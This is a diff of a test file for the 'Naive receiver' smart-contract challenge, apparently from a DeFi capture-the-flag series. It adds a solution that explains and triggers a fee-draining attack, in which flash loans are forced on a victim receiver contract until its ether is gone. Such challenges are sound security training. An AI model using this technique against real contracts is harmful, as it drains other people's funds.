@@ -19,18 +19,32 @@ describe('[Challenge] Naive receiver', function () {
 
         this.pool = await LenderPoolFactory.deploy();
         await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
-        
+
         expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
         expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));
 
         this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
         await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
-        
+
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */
+        /**
+         * EXPLOIT:
+         * The pool allows anyone to call flash loans on another's behalf,
+         * as such valueles flash loans van be called on behalf of the vitcim,
+         * making them pay the fee until their funds are drained.
+         * 
+         * The `attackerContract` has an `attack` method which does this to the `receiver`,
+         * until they can no longer pay the fee,
+         * at which point they have lost all funds.
+         */
+        const AttackerFactory = await ethers.getContractFactory('Attacker', attacker);
+        this.attackerContract = await AttackerFactory.deploy(this.receiver.address, this.pool.address);
+        await this.attackerContract.attack();
+
     });
 
     after(async function () {
